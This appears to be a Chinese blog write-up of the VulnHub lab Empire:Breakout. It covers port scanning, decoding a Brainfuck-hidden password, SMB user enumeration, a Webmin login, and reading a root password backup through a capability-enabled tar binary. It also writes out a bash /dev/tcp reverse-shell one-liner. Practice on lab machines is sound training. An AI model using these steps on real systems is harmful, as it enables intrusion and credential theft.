---
title: vulnhub 做题 Empire:Breakout
tags: [penetration]
date: 2024-10-13 00:00:00
categories: [penetration]
excerpt: day2
---

## vulnhub 做题 Empire:Breakout

### 扫描

```zsh
└─$ nmap -p 1-65535 -sV 192.168.140.48
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-12 01:42 EDT
Nmap scan report for 192.168.140.48
Host is up (0.0011s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
```

除了80还开了四个端口

80是一个apache的web服务，10000和20000一样，都是一个https的登陆界面。139和445还不知道是什么。


![](/img/pene/3.png)


实际上，80端口这个apache的默认测试页html里藏了东西 ~~（谁能想到这种页面会藏东西😶‍🌫️）~~

如果用curl查看这个页面就很容易发现，因为藏的东西在最后

```
<!--
don't worry no one will get here, it's safe to share with you my access. Its encrypted :)

++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.


-->
```

我也不认识这是个什么加密，去问了一下大模型，说是Brainfuck代码，用bugkuctf的工具解密出来是这个么个东西：`.2uqPEfj3D<P'a-3`

那两个不知道是什么的端口去查了一下：Samba是在Linux和UNIX系统上实现SMB协议的一个免费软件 ~~（去msf搜了一下发现根本没有4.6.2这么新版本的漏洞）~~

查了一下（ https://blog.csdn.net/redwand/article/details/113730414 ），说是smb协议可以用enum4linux进行信息收集

```zsh
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                          
S-1-22-1-1000 Unix User\cyber (Local User) 
```

扫到了一个用户名cyber，结合前面解密出来的东西，试一下这个组合是不是web的账户。

10000登不上去，20000登进去了，似乎是一个邮件系统

![](/img/pene/4.png)

左下角有一个功能可以打开一个命令行，/home/cyber 下有一个flag

```zsh
[cyber@breakout ~]$ cat user.txt
3mp!r3{You_Manage_To_Break_To_My_Secure_Access}
```

天真的我以为到这里就完了，但是看了一眼别人的题解，还有后续😭

用户目录下有一个tar，并且是能读取任意文件的

```zsh
[cyber@breakout ~]$ getcap ./tar
./tar cap_dac_read_search=ep
```

给这个的东西应该是让压缩一个不能读取的文件，再解压出来，就是一个能读取的了

在文件系统里找，发现/var目录下有一个.old_pass.bak，并且不能读，应该就是他了

```zsh
[cyber@breakout ~]$ ./tar -czvf test.tar.gz /var/backups/.old_pass.bak
./tar: Removing leading `/' from member names
/var/backups/.old_pass.bak
[cyber@breakout ~]$ ls
tar
test.tar.gz
user.txt
[cyber@breakout ~]$ ./tar -zxvf ./test.tar.gz
var/backups/.old_pass.bak
[cyber@breakout ~]$ ls
tar
test.tar.gz
user.txt
var
[cyber@breakout ~]$ cat ./var/backups/.old_pass.bak
Ts&4&YurgtRX(=~h

[cyber@breakout ~]$
```

这应该就是root的密码，但是在这个webshell里su不给输入密码的机会，所以反弹一个shell

（直接在vmware上也可以登录了）

`bash -i >& /dev/tcp/192.168.169.128/9999 0>&1`

但是kali能ping通靶机，靶机ping不通kali，反弹shell也起不来 （Network is unreachable）

把靶机和kali都用nat就好了，也不知道为啥😶‍🌫️ ~~（计网没好好学的下场）~~

```zsh
[root@breakout ~]$ cat ./rOOt.txt
3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}

Author: Icex64 & Empire Cybersecurity
```


> 还有一种方法是，那个20000端口的webmin也是可以用root账号登陆的，直接登录进去就是root
> 
> 😶‍🌫️😶‍🌫️😶‍🌫️😶‍🌫️😶‍🌫️😶‍🌫️😶‍🌫️😶‍🌫️😶‍🌫️😶‍🌫️
